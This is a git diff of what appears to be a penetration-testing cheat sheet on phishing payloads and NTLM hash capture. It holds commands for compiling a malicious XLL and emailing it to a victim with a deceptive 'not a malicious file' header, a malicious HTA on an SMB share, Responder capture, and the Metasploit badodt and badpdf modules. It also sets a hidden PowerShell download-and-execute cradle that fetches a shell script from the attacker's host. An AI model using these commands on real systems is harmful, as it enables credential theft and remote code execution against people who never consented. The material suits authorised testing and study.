@@ -68,13 +68,13 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 }
 ```
 
-#### 1. Compile shell.c in Linux
+#### 1. Compile in Linux
 
 ```console
 x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll shell.c -luser32
 ```
 
-#### 2. Send Email with the Malicious xll File
+#### 2. Send Email
 
 ```console
 swaks --to '<VICTIM>@<DOMAIN>' --from 'attacker@<DOMAIN>' --server '<DOMAIN>' --header 'This is not a malicious file' --body 'This is not a malicious file' --attach '@shell.xll'
@@ -92,7 +92,7 @@ swaks --to '<VICTIM>@<DOMAIN>' --from 'attacker@<DOMAIN>' --server '<DOMAIN>' --
 impacket-smbserver -smb2support share .
 ```
 
-#### 2. Create a Malicious hta File in local Linux SMB Share
+#### 2. Create a Malicious hta File in Local Linux SMB Share
 
 ```console
 <html>
@@ -133,8 +133,6 @@ Set-Content -Path $shortcutPath -Value $shortcutContent
 {{< /tabcontent >}}
 {{< tabcontent set1 tab4 >}}
 
-### If Any Interaction from Target to SMB Share
-
 #### 1. Start Responder
 
 ```console
@@ -165,6 +163,60 @@ mput evil.scf
 {{< /tabcontent >}}
 {{< tabcontent set1 tab5 >}}
 
+### Metasploit
+
+#### Capture NTLM
+
+```console
+# Start responder
+sudo responder -I <INTERFACE>
+```
+
+```console {class="sample-code"}
+sudo responder -I tun0
+```
+
+```console
+# File write require root privilege
+sudo msfconsole -q
+```
+
+```console
+use auxiliary/fileformat/odt_badodt
+```
+
+```console
+set lhost <LOCAL_IP>
+run
+```
+
+#### RCE
+
+```console
+# Start http server
+python3 -m http.server <PORT>
+```
+
+```console
+# Start listener
+rlwrap ncat -lvnp <LOCAL_PORT>
+```
+
+```console
+# msfconsole
+use multi/misc/openoffice_document_macro
+```
+
+```console
+set payload windows/x64/exec
+set cmd "powershell.exe -nop -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://<LOCAL_IP>:<PORT>/<SHELL_SCRIPT>');"
+set srvhost <LOCAL_IP>
+set lhost <LOCAL_IP>
+run
+```
+
+---
+
 ### Manual
 
 ```console
@@ -193,75 +245,6 @@ End Sub
 +-----------------------------------------------------------+
 ```
 
----
-
-### Metasploit
-
-#### 1. Capture NTLM
-
-```console
-# Start responder
-sudo responder -I <INTERFACE>
-```
-
-```console {class="sample-code"}
-sudo responder -I tun0
-```
-
-```console
-# File write require root privilege
-sudo msfconsole -q
-```
-
-```console
-use auxiliary/fileformat/odt_badodt
-```
-
-```console
-set lhost <LOCAL_IP>
-```
-
-```console
-run
-```
-
-#### 2. RCE
-
-```console
-# Start http server
-python3 -m http.server <PORT>
-```
-
-```console
-# Start listener
-rlwrap ncat -lvnp <LOCAL_PORT>
-```
-
-```console
-# msfconsole
-use multi/misc/openoffice_document_macro
-```
-
-```console
-set payload windows/x64/exec
-```
-
-```console
-set cmd "powershell.exe -nop -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://<LOCAL_IP>:<PORT>/<SHELL_SCRIPT>');"
-```
-
-```console
-set srvhost <LOCAL_IP>
-```
-
-```console
-set lhost <LOCAL_IP>
-```
-
-```console
-run
-```
-
 {{< /tabcontent >}}
 {{< tabcontent set1 tab6 >}}
 
@@ -270,28 +253,29 @@ msfconsole -q
 ```
 
 ```console
-search badpdf
+use auxiliary/fileformat/badpdf
 ```
 
 ```console
 set filename evil.pdf
-```
-
-```console
 set lhost <LOCAL_IP>
-```
-
-```console
-exploit
+run
 ```
 
 {{< /tabcontent >}}
 {{< tabcontent set1 tab7 >}}
 
 ```console
-python3 ntlm_theft.py -g all -s <LOCAL_IP> -f test
+python3 ntlm_theft.py -g all -s <LOCAL_IP> -f <OUTPUT>
 ```
 
 <small>*Ref: [ntlm_theft](https://github.com/Greenwolf/ntlm_theft)*</small>
 
+```console
+python3 hashgrab.py <LOCAL_IP> <OUTPUT>
+```
+
+<small>*Ref: [hashgrab](https://github.com/xct/hashgrab)*</small>
+
 {{< /tabcontent >}}
+
